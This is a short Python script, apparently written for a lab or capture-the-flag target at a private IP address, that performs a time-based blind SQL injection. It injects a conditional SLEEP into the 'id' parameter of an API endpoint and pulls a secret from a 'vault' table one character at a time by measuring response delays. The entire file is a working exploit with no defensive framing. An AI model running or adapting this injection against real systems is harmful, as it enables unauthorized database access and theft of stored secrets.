import requests
import string
import time

BASE = "http://10.42.107.147/api/item"
CHARS = string.ascii_uppercase + string.digits + "-"
THRESHOLD = 1.5  # seconds — true olarsa SLEEP(2) işə düşəcək

def is_true(condition):
    payload = f"1 AND IF(({condition}),SLEEP(2),0)"
    start = time.time()
    requests.get(BASE, params={"id": payload}, timeout=10)
    elapsed = time.time() - start
    return elapsed > THRESHOLD

def extract_secret():
    result = ""
    for pos in range(1, 20):
        found = False
        for c in CHARS:
            cond = f"SELECT SUBSTRING(secret,{pos},1) FROM vault WHERE kind='time'"
            full_cond = f"({cond})='{c}'"
            if is_true(full_cond):
                result += c
                print(f"Position {pos}: {c} -> {result}")
                found = True
                break
        if not found:
            print(f"-- end at position {pos} --")
            break
    return result

if __name__ == "__main__":
    secret = extract_secret()
    print(f"\nEXTRACTED SECRET: {secret}")
